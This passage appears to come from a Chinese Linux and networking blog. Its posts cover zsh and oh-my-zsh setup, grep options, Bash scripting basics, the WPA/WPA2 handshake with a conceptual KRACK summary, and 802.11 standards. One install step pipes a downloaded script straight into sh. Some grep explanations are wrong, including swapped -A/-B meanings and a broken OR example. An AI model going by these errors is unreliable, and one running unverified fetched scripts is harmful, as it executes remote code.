    <url>/blog/2019/03/19/zsh%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Agrep%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>好久没写过博客了，最近一直在和hostapd纠缠不休，课也比较多。今天心血来潮写一篇~~~整好今天装了个挺好用的小工具zsh，记一下安装和配置，以及命令grep的使用命令</strong></p><p><img src="/images/fj17.jpg"></p><span id="more"></span><h1 id="Zsh"><a href="#Zsh" class="headerlink" title="Zsh"></a>Zsh</h1><h2 id="zsh介绍"><a href="#zsh介绍" class="headerlink" title="zsh介绍"></a>zsh介绍</h2><p>zsh被誉为shell中的极品，自然有他的道理。Zsh 官网：<a href="http://www.zsh.org/">http://www.zsh.org/</a>   它兼容 Bash，据传说 99% 的 Bash 操作 和 Zsh 是相同的。</p><h2 id="zsh安装"><a href="#zsh安装" class="headerlink" title="zsh安装"></a>zsh安装</h2><p>Ubuntu下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install zsh<br></code></pre></td></tr></table></figure><p><strong>使用 Zsh 扩展集合：oh-my-zsh</strong></p><ul><li>首先确保自己电脑中安装了git，若未安装先安装git</li><li>安装oh-my-zsh:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.github.com<span class="hljs-regexp">/robbyrussell/</span>oh-my-zsh<span class="hljs-regexp">/master/</span>tools/install.sh -O - | sh<br></code></pre></td></tr></table></figure></li><li>在以 root 用户为前提下，oh-my-zsh 的安装目录：&#x2F;root&#x2F;.oh-my-zsh</li><li>在以 root 用户为前提下，Zsh 的配置文件位置：&#x2F;root&#x2F;.zshrc</li><li>为 root 用户设置 zsh 为系统默认 shell：chsh -s &#x2F;bin&#x2F;zsh root</li><li>如果你要重新恢复到 bash：chsh -s &#x2F;bin&#x2F;bash</li><li>查看是否修改shell成功<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure></li><li>现在你关掉终端或是重新连上 shell，现在开头是一个箭头了</li></ul><h2 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h2><p>编辑配置文件：vim &#x2F;root&#x2F;.zshrc<br>具体怎么配置，作者在注释里面说的很清楚。<br>###推荐两个插件：###</p><ol><li>autojump</li></ol><ul><li><p>这个插件会记录你常去的那些目录，然后做一下权重记录，你可以用这个命令看到你的习惯：j –stat，如果这个里面有你的记录，那你就只要敲最后一个文件夹名字即可进入，比如我个人习惯的 program：j program，就可以直接到：&#x2F;usr&#x2F;program</p></li><li><p>插件官网：<a href="https://github.com/wting/autojump">https://github.com/wting/autojump</a></p></li><li><p>官网插件下载地址：<a href="https://github.com/wting/autojump/downloads">https://github.com/wting/autojump/downloads</a></p></li><li><p>插件下载：wget <a href="https://github.com/downloads/wting/autojump/autojump_v21.1.2.tar.gz">https://github.com/downloads/wting/autojump/autojump_v21.1.2.tar.gz</a></p></li><li><p>解压：tar zxvf autojump_v21.1.2.tar.gz</p></li><li><p>进入解压后目录并安装：cd autojump_v21.1.2&#x2F; ; .&#x2F;install.sh</p></li><li><p>再执行下这个：source &#x2F;etc&#x2F;profile.d&#x2F;autojump.sh</p></li><li><p>编辑配置文件，添加上 autojump 的名字：vim &#x2F;root&#x2F;.zshrc</p></li></ul><ol start="2"><li>zsh-syntax-highlighting</li></ol><ul><li>这个插件会对终端命令高亮显示,比如正确的拼写会是绿色标识,否则是红色,另外对于一些shell输出语句也会有高亮显示,算是不错的辅助插件</li><li>插件官网：<a href="https://github.com/zsh-users/zsh-syntax-highlighting">https://github.com/zsh-users/zsh-syntax-highlighting</a></li><li>安装，复制该命令：git clone <a href="https://github.com/zsh-users/zsh-syntax-highlighting.git">https://github.com/zsh-users/zsh-syntax-highlighting.git</a> ${ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom}&#x2F;plugins&#x2F;zsh-syntax-highlighting</li><li>编辑：vim ~&#x2F;.zshrc，找到这一行，后括号里面的后面添加：plugins&#x3D;( 前面的一些插件名称 zsh-syntax-highlighting)</li><li>刷新下配置：source ~&#x2F;.zshrc</li></ul><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>编辑配置文件：vim &#x2F;root&#x2F;.zshrc</p><p>找到ZSH_THEME&#x3D;”ys”,个人觉得这个主题挺好看。<br>设置完记得刷新配置。</p><p>###人性化设计###</p><ul><li>tab有惊喜</li><li>使用 ctrl-r 来搜索命令历史记录。按完此快捷键后，可以输入关键命令词语，如果历史记录有含有此词语会显示出来。</li><li>命令别名：<br>在命令行中输入 alias 可以查看已经有的命令别名<br>自己新增一些别名，编辑文件：vim ~&#x2F;.zshrc，在文件加入下面格式的命令，比如以下是网友提供的一些思路：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">alias <span class="hljs-attribute">cls</span>=<span class="hljs-string">&#x27;clear&#x27;</span><br>alias <span class="hljs-attribute">ll</span>=<span class="hljs-string">&#x27;ls -l&#x27;</span><br>alias <span class="hljs-attribute">la</span>=<span class="hljs-string">&#x27;ls -a&#x27;</span><br>alias <span class="hljs-attribute">grep</span>=<span class="hljs-string">&quot;grep --color=auto&quot;</span><br>alias -s <span class="hljs-attribute">html</span>=<span class="hljs-string">&#x27;vim&#x27;</span>   # 在命令行直接输入后缀为 html 的文件名，会在 Vim 中打开<br>alias -s <span class="hljs-attribute">rb</span>=<span class="hljs-string">&#x27;vim&#x27;</span>     # 在命令行直接输入 ruby 文件，会在 Vim 中打开<br>alias -s <span class="hljs-attribute">py</span>=<span class="hljs-string">&#x27;vim&#x27;</span>      # 在命令行直接输入 python 文件，会用 vim 中打开，以下类似<br>alias -s <span class="hljs-attribute">js</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">java</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">txt</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">gz</span>=<span class="hljs-string">&#x27;tar -xzvf&#x27;</span> # 在命令行直接输入后缀为 gz 的文件名，会自动解压打开<br>alias -s <span class="hljs-attribute">tgz</span>=<span class="hljs-string">&#x27;tar -xzvf&#x27;</span><br>alias -s <span class="hljs-attribute">zip</span>=<span class="hljs-string">&#x27;unzip&#x27;</span><br>alias -s <span class="hljs-attribute">bz2</span>=<span class="hljs-string">&#x27;tar -xjvf&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="grep的使用"><a href="#grep的使用" class="headerlink" title="grep的使用"></a>grep的使用</h1><h2 id="grep常用参数说明"><a href="#grep常用参数说明" class="headerlink" title="grep常用参数说明"></a>grep常用参数说明</h2><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ldif">grep [OPTIONS] PATTERN [FILE...]<br>grep [OPTIONS] [-e PATTERN]...  [-f FILE]...  [FILE...]<br><br><span class="hljs-attribute">OPTIONS</span>:<br><span class="hljs-literal">-</span>e: 使用正则搜索<br><span class="hljs-literal">-</span>i: 不区分大小写<br><span class="hljs-literal">-</span>v: 查找不包含指定内容的行<br><span class="hljs-literal">-</span>w: 按单词搜索<br><span class="hljs-literal">-</span>c: 统计匹配到的次数<br><span class="hljs-literal">-</span>n: 显示行号<br><span class="hljs-literal">-</span>r: 逐层遍历目录查找<br><span class="hljs-literal">-</span>A: 显示匹配行及前面多少行, 如: -A3, 则表示显示匹配行及前3行<br><span class="hljs-literal">-</span>B: 显示匹配行及后面多少行, 如: -B3, 则表示显示匹配行及后3行<br><span class="hljs-literal">-</span>C: 显示匹配行前后多少行,   如: -C3, 则表示显示批量行前后3行<br><span class="hljs-literal">-</span>-color: 匹配到的内容高亮显示<br><span class="hljs-literal">-</span>-include: 指定匹配的文件类型<br><span class="hljs-literal">-</span>-exclude: 过滤不需要匹配的文件类型<br></code></pre></td></tr></table></figure><h2 id="grep常用用法"><a href="#grep常用用法" class="headerlink" title="grep常用用法"></a>grep常用用法</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#多文件查询</span><br>grep leo logs.<span class="hljs-built_in">log</span> logs_back.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找即包含leo又包含li的行</span><br>grep leo logs.<span class="hljs-built_in">log</span> <span class="hljs-string">| grep li</span><br><br><span class="hljs-meta">#查找匹配leo或者匹配li的行</span><br>grep leo <span class="hljs-string">| li logs.log</span><br><br><span class="hljs-meta">#显示匹配行前2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -A2<br><br><span class="hljs-meta">#显示匹配行后2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -B2<br><br><span class="hljs-meta">#显示匹配行前后2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -C2<br><br><span class="hljs-meta">#不区分大小写</span><br>grep -i leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#使用正则表达式</span><br>grep -e &#x27;[a-z]\&#123;5\&#125;&#x27; logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找不包含leo的行</span><br>grep -v leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#统计包含leo的行数</span><br>grep -c leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#遍历当前目录及所有子目录查找匹配leo的行</span><br>grep -r leo .<br><br><span class="hljs-meta">#在当前目录及所有子目录查找所有java文件中查找leo</span><br>grep -r leo . --include <span class="hljs-string">&quot;*.java&quot;</span><br><br><span class="hljs-meta">#查找并输出到指定文件</span><br>grep leo logs.<span class="hljs-built_in">log</span> &gt; result.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找以leo开头的行</span><br>grep ^leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找以leo结尾的行</span><br>grep leo$ logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找空行</span><br>grep ^$ logs.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>实用工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下shell脚本的编写</title>
    <link href="/blog/2018/12/10/Linux%E4%B8%8Bshell%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <url>/blog/2018/12/10/Linux%E4%B8%8Bshell%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p><strong>由于需要频繁使用相同的命令，今天学习一下如何再Linux下编写简单的shell脚本，简化操作，节省时间</strong></p><p><img src="/images/fj16.jpg"></p><span id="more"></span><h2 id="规范格式"><a href="#规范格式" class="headerlink" title="规范格式"></a>规范格式</h2><p>我们关注的重点是Bash，也就是Bourne Again Shell，由于易用和免费，Bash在日常工作中被广泛使用；同时，Bash也是大多数Linux系统默认的Shell。在一般情况下，人们并不区分 Bourne Shell和Bourne Again Shell，所以，在下面的文字中，我们可以看到#!&#x2F;bin&#x2F;sh，它同样也可以改为#!&#x2F;bin&#x2F;bash。<br>利用vi等文本编辑器编写Shell脚本的格式是固定的，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment">#comments</span><br>Your commands go here<br></code></pre></td></tr></table></figure><p>首行中的符号#!告诉系统其后路径所指定的程序即是解释此脚本文件的Shell程 序。如果首行没有这句话，在执行脚本文件的时候，将会出现错误。后续的部分就是主程序，Shell脚本像高级语言一样，也有变量赋值，也有控制语句。除第 一行外，以#开头的行就是注释行，直到此行的结束。如果一行未完成，可以在行尾加上”，这个符号表明下一行与此行会合并为同一行。<br>编辑完毕，将脚本存盘为filename.sh，文件名后缀sh表明这是一个Bash脚本文件。执行脚本的时候，要先将脚本文件的属性改为可执行的：<br>chmod +x filename.sh<br>执行脚本的方法是：<br>.&#x2F;filename.sh</p><h2 id="Shell的基本知识"><a href="#Shell的基本知识" class="headerlink" title="Shell的基本知识"></a>Shell的基本知识</h2><p>与其他语言不同，Shell Script中if语句的条件部分要以分号来分隔。第三行中的[]表示条件测试，常用的条件测试有下面几种：<br>[ -f “$file” ] 判断$file是否是一个文件<br>[ $a -lt 3 ] 判断$a的值是否小于3，同样-gt和-le分别表示大于或小于等于<br>[ -x “$file” ] 判断$file是否存在且有可执行权限，同样-r测试文件可读性<br>[ -n “$a” ] 判断变量$a是否有值，测试空串用-z<br>[ “$a” &#x3D; “$b” ] 判断$a和$b的取值是否相等<br>[ cond1 -a cond2 ] 判断cond1和cond2是否同时成立，-o表示cond1和cond2有一成立<br>要注意条件测试部分中的空格。在方括号的两侧都有空格，在-f、-lt、&#x3D;等符号两侧同样也有空格。如果没有这些空格，Shell解释脚本的时候就会出错。</p><p>Linux中bash shell语音保留的关键字：<br>case、elif、let、clear、else、read、continue、if、then、echo、for in、while</p><p>2.1. shell提示符及其环境<br>提示符：$<br>环境：Linux，Unix，Dos等等<br>Shell其实就是一个解释执行命令的程序，所谓shell编程其实就是用一定的语法将各种基本的命令组合起来，让shell程序去解释执行。<br>同传统的编程语言一样，shell提供了很多特性，这些特性可以使你的shell script编程更为有用，如：数据变量、参数传递、判断、流程控制、数据输入和输出，子程序及以中断处理等。<br>2.2 如何执行shell程序<br>Shell程序（***.sh）<br>? 执行这个命令时<br>(1) #.&#x2F;***.sh<br>(2) #chmod u+x <em><strong>.sh<br>#</strong></em>.sh<br>(3) #sh ***.sh<br>2.3 常量<br>? 字符串，例如“Hello World！”。<br>? 数字，例如705，23。</p><p>2.4 变量<br>shell编程中它们是没有类型的，简称弱类型编程语言，在这个变量中可以保含一个数字，一个字符串，一个单词等。你并不需要声明这个变量，它会在引用这个变量时创建它。<br>STR&#x3D;”Hello World!”<br>echo $STR<br>　　HOME&#x3D;”&#x2F;home”                &#x2F;&#x2F;注意赋值不要有空格<br>　　a&#x3D;123<br>　　HOME_LIST&#x3D;$(ls &#x2F;home) &#x2F;&#x2F;把命令的执行结果赋值给变量<br>　　ehco $HOME                   &#x2F;&#x2F;$ 符号是获得变量HOME的值<br>　　a&#x3D;a+1<br>系统变量：<br>　　$0 这个程序的执行名字<br>　　$n 　这个程序的第n个参数值，n&#x3D;1…9<br>　　$*　 这个程序的所有参数<br>　　$# 这个程序的参数个数<br>　　$$ 这个程序的PID<br>　　$! 执行上一个背景指令的PID<br>   $? 上一个指令的返回值<br>2.5 局部变量<br> 局部变量一般是指写在函数中的变量，他的生命力是有限的。局部变量比较好理解，这里就不再多介绍了。<br>2.6 从键盘输入变量值<br>使用read命令<br>read var1 var2 … varn<br>2.7 注释<br>?Shell编程中的注释以#开头<br>2.8 数字运算<br>主要是指整数运算。expr命令可以将字符型变量转换为整数进行操作<br>语法：expr integer operator integer<br>其中operator为+ - * &#x2F; %, 但对<em>的使用要用转义符&#x2F;,如：<br>[oracle@localhost ~]$ more dvd.sh<br>#!&#x2F;bin&#x2F;bash<br>expr 5 &#x2F;</em> 5<br>[oracle@localhost ~]$ sh dvd.sh<br>25<br>2.9 逻辑运算<br>test进行逻辑运算，用[ ]括起来就是test运算<br>int1 -eq int2 相等?<br>int1 -ne int2 不等?<br>int1 -gt int2 int1 &gt; int2 ?<br>int1 -ge int2 int1 &gt;&#x3D; int2 ?<br>int1 -lt int2 int1 &lt; int2 ?<br>int1 -le int2 int1 &lt;&#x3D; int2<br>2.10 双引号及单引号<br>?$echo “$HOME $PATH”  – 显示变量值<br>&#x2F;home&#x2F;hbwork opt&#x2F;kde&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:<br> $echo ‘$HOME $PATH’  – 显示单引号里的内容<br>$HOME $PATH<br>2.11 空格<br>由于shell对命令中的多余的空格不作任何处理 ，而用引号括起来则可以防止shell去掉这些空格。<br>$ str1&#x3D;abcd<br>$ str2&#x3D;”abcd “<br>2.12 分支结构<br>if [ variable &#x3D; value ]<br>then<br>command<br>else<br>if [ variable &#x3D; value ]<br>then<br>command<br>else<br>command<br>fi<br>2.13 Case语句<br>case value in<br>pattern1)<br>command;;<br>pattern2)<br>command;;<br>…<br>patternn)<br>command;<br>esac<br>2.15 循环语句<br>For循环：<br>for var in arg1 arg2 … argn<br>do<br>command<br>….<br>command<br>done</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This script must be run as root&quot;</span> 1&gt;&amp;2<br>   <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>tar -Jcvf /home/xin/Desktop/hostapd-2018-05-21-62566bc2.tar.xz /home/xin/Desktop/hostapd-2018-05-21-62566bc2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;compile Success!&quot;</span><br><br><span class="hljs-built_in">mv</span> -i /home/xin/Desktop/hostapd-2018-05-21-62566bc2.tar.xz /home/xin/openwrt/dl<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;move Success!&quot;</span><br><br>make FORCE\_UNSAFE\_CONFIGURE=1 V=s<br></code></pre></td></tr></table></figure><p>自己写的一个很简单的shell脚本。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPA/WPA2 4-way handshake</title>
    <link href="/blog/2018/11/18/WPA-WPA2-4-way-handshake/"/>
    <url>/blog/2018/11/18/WPA-WPA2-4-way-handshake/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下WPA&#x2F;WPA2四部握手的过程，了解其中的信息交互过程，为项目代码修改做准备。</strong></p><p><img src="/images/fj15.jpg"></p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>IEEE 802.11i通过提供具有两种新协议的强健安全网络（RSN）来增强IEEE 802.11-1999：四次握手和组密钥握手。它们利用IEEE 802.1X中描述的认证服务和端口访问控制来建立和更改适当的加密密钥。RSN是一种安全网络，只允许创建健壮的安全网络关联（RSNA），这是一对站点（STA）使用的关联类型，如果建立身份验证或关联的过程它们包括4-Way Handshake。</p><p>该标准还提供了两种RSNA数据机密性和完整性协议，TKIP和CCMP，因为TKIP的机密性和完整性机制不像CCMP那样强大，因此CCMP的实施是强制性的。实施TKIP的主要目的是该算法应该在大多数仅支持WEP的旧设备的能力范围内实现。</p><p>初始认证过程使用预共享密钥（PSK）或通过802.1X 进行EAP交换（称为EAPOL，需要存在认证服务器）来执行。此过程确保客户端站（STA）通过接入点（AP）进行身份验证。在PSK或802.1X认证之后，生成共享密钥，称为成对主密钥（PMK）。PMK源自通过PBKDF2 -SHA1作为加密散列函数的密码。在预共享密钥网络中，PMK实际上是PSK。如果执行了802.1X EAP交换，则PMK从认证服务器提供的EAP参数派生。</p><h2 id="四次握手"><a href="#四次握手" class="headerlink" title="四次握手"></a>四次握手</h2><p><img src="/images/4-way-handshake.svg.png"></p><p>四次握手的设计使得接入点（或认证者）和无线客户端（或请求者）可以彼此独立地证明他们知道PSK &#x2F; PMK，而不会泄露密钥。接入点（AP）和客户端不会泄露密钥，而是相互加密消息 - 只能通过使用已经共享的PMK进行解密 - 如果消息的解密成功，则证明了PMK的知识。四次握手对于保护PMK免受恶意接入点的影响至关重要 - 例如，攻击者的SSID冒充真实接入点 - 这样客户端就不必告知接入点其PMK。</p><p>PMK旨在持续整个会话，应尽可能少地暴露; 因此，需要导出加密流量的密钥。四次握手用于建立另一个称为成对瞬态密钥（PTK）的密钥。通过连接以下属性生成PTK ：PMK，AP nonce（ANonce），STA nonce（SNonce），AP MAC地址和STA MAC地址。然后将产品通过伪随机函数。握手还产生GTK（组临时密钥），用于解密多播和广播流量。</p><p>在握手期间交换的实际消息在图中描述并在下面解释（所有消息都作为EAPOL -Key帧发送）：</p><ol><li>所述AP用钥匙重放计数器，其是用于匹配每对发送的消息，并丢弃重播消息的号码一起发送一个随机数-值（的ANonce）到STA。STA现在具有构建PTK的所有属性。</li><li>STA将其自己的随机值（SNonce）与消息完整性代码（MIC）一起发送到AP ，包括认证，其实际上是消息认证和完整性代码（MAIC），以及密钥重放计数器将是相同的作为消息1，允许AP匹配正确的消息1。</li><li>AP通过检查MIC，RSN，ANonce和密钥重放计数器字段来验证消息2，如果有效，则构建并用另一个MIC发送GTK。</li><li>STA通过检查MIC和密钥重放计数器字段来验证消息3，并且如果有效则向AP发送确认。</li></ol><p><img src="/images/wpa.png"></p><p>详见：<a href="https://mrncciew.com/2014/08/19/cwsp-4-way-handshake/" title="WPA四步握手过程">https://mrncciew.com/2014/08/19/cwsp-4-way-handshake/</a><br><strong>4次握手完成以后，之后的帧传播就都会以加密的方式进行。</strong></p><p>成对瞬态密钥（64字节）分为五个单独的密钥：</p><ol><li>16字节的EAPOL-Key确认密钥（KCK） - 用于计算WPA EAPOL密钥消息的MIC</li><li>16字节的EAPOL密钥加密密钥（KEK） - AP使用此密钥加密发送到客户端的附加数据（在“密钥数据”字段中）（例如，RSN IE或GTK）</li><li>16字节的临时密钥（TK） - 用于加密&#x2F;解密单播数据包</li><li>8个字节的Michael MIC Authenticator Tx Key - 用于计算AP发送的单播数据包的MIC</li><li>8个字节的Michael MIC Authenticator Rx Key - 用于计算由站发送的单播数据包的MIC</li></ol><p>Group Temporal Key（32字节）分为三个独立的键：</p><ol><li>16字节的组时间加密密钥 - 用于加密&#x2F;解密多播和广播数据包</li><li>8个字节的Michael MIC Authenticator Tx Key - 用于计算AP发送的组播和广播数据包的MIC</li><li>8个字节的Michael MIC Authenticator Rx Key - 当前未使用的站点不发送多播流量</li></ol><p>仅当网络使用TKIP加密数据时，才使用PTK和GTK中的Michael MIC Authenticator Tx &#x2F; Rx密钥。</p><p>已证明四步握手易受<strong>KRACK（密钥重装攻击）</strong>攻击。</p><p><img src="/images/4-way-handshake.png"></p><p>如图所示，KRACK攻击主要发生在认证和密钥建立阶段的四步握手过程中，通过简单的报文模拟诱使安全协议交互的一方重发密钥交互协议中的一条消息，另一方收到重发的这条消息后再次安装已安装过的密钥，安装时将IV等相关的信息重置后使用，从而导致了同一个密钥使用了相同的IV再次加密数据，最终造成数据被重放、解密甚至伪造等安全危害。该攻击不仅针对WPA2，对于WPA也同样适用，不论是采用预共享密钥机制还是采用IEEE 802.1x机制的Wi-Fi网络都受到该漏洞的影响。<br>详见：<a href="https://blog.csdn.net/yuaninbj/article/details/78794159" title="KRACK深度剖析">https://blog.csdn.net/yuaninbj/article/details/78794159</a></p><h2 id="组密钥握手"><a href="#组密钥握手" class="headerlink" title="组密钥握手"></a>组密钥握手</h2><p>由于预设定时器到期，可能需要更新网络中使用的组临时密钥（GTK）。当设备离开网络时，GTK也需要更新。这是为了防止设备从AP接收更多的多播或广播消息。</p><p>为了处理更新，802.11i定义了一个由双向握手组成的组密钥握手：</p><ol><li>AP将新GTK发送给网络中的每个STA。GTK使用分配给该STA的KEK加密，并通过使用MIC保护数据不被篡改。</li><li>STA确认新的GTK并回复AP。</li></ol><h2 id="CCMP概述"><a href="#CCMP概述" class="headerlink" title="CCMP概述"></a>CCMP概述</h2><p>CCMP基于AES加密算法的CCM。CCM结合了CTR的机密性和CBC-MAC的身份验证和完整性。CCM保护MPDU数据字段和IEEE 802.11 MPDU报头的选定部分的完整性。</p><h2 id="密钥层次结构"><a href="#密钥层次结构" class="headerlink" title="密钥层次结构"></a>密钥层次结构</h2><p>RSNA定义了两个关键层次结构：</p><ol><li>成对密钥层次结构，用于保护单播流量</li><li>GTK，一种由单个密钥组成的层次结构，用于保护多播和广播流量</li></ol><p>密钥层次结构的描述使用以下两个函数：</p><ul><li>L（Str，F，L） - 从左边开始，从提取位F到F + L-1。</li><li>RF-n - 产生n位输出的伪随机函数，有128,192,256,384和512版本，每个都输出这些位数。</li></ul><p>成对密钥层次结构利用PRF-384或PRF-512从PMK导出会话特定密钥，生成PTK，该PTK被分区为KCK和KEK以及MAC使用的所有临时密钥以保护单播通信。</p><p>GTK应该是一个随机数，它也是通过使用PRF-n生成的，通常是PRF-128或PRF-256，在这个模型中，组密钥层次结构采用GMK（组主密钥）并生成GTK。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
      <tag>802.11</tag>
      
      <tag>WPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>802.11协议、WiFi连接交互过程</title>
    <link href="/blog/2018/11/11/802-11%E5%8D%8F%E8%AE%AE%E3%80%81WiFi%E8%BF%9E%E6%8E%A5%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/"/>
    <url>/blog/2018/11/11/802-11%E5%8D%8F%E8%AE%AE%E3%80%81WiFi%E8%BF%9E%E6%8E%A5%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>本周主要任务是更深入的了解WiFi连接过程中AP与STA之间的交互过程，深入理解802.11标准，为以后协议的修改做准备。</strong></p><p><img src="/images/fj14.jpg"></p><span id="more"></span><h1 id="802-11基本介绍"><a href="#802-11基本介绍" class="headerlink" title="802.11基本介绍"></a>802.11基本介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>802.11为IEEE（美国电气和电子工程师协会，The Institute of Electrical and Electronics Engineers）于1997年公告的无线区域网路标准，适用于有线站台与无线用户或无线用户之间的沟通连结。</p><h2 id="规格一览"><a href="#规格一览" class="headerlink" title="规格一览"></a>规格一览</h2><ul><li>IEEE 802.11 ，1997年，原始标准（2Mbit&#x2F;s，工作在2.4GHz）。</li><li>IEEE 802.11a，1999年，物理层补充（54Mbit&#x2F;s，工作在5GHz）。</li><li>IEEE 802.11b，1999年，物理层补充（11Mbit&#x2F;s工作在2.4GHz）。</li><li>IEEE 802.11c，符合802.1D的媒体接入控制层桥接（MAC Layer Bridging）。</li><li>IEEE 802.11d，根据各国无线电规定做的调整。</li><li>IEEE 802.11e，对服务等级（Quality of Service, QoS）的支持。</li><li>IEEE 802.11f，基站的互连性（IAPP, Inter-Access Point Protocol），2006年2月被IEEE批准撤销。</li><li>IEEE 802.11g，2003年，物理层补充（54Mbit&#x2F;s，工作在2.4GHz）。</li><li>IEEE 802.11h，2004年，无线覆盖半径的调整，室内（indoor）和室外（outdoor）信道（5GHz频段）。</li><li>IEEE 802.11i，2004年，无线网络的安全方面的补充。</li><li>IEEE 802.11j，2004年，根据日本规定做的升级。</li><li>IEEE 802.11l，预留及准备不使用。</li><li>IEEE 802.11m，维护标准；互斥及极限。</li><li>IEEE 802.11n，更高传输速率的改善，支持多输入多输出技术（Multi-Input Multi-Output，MIMO）。 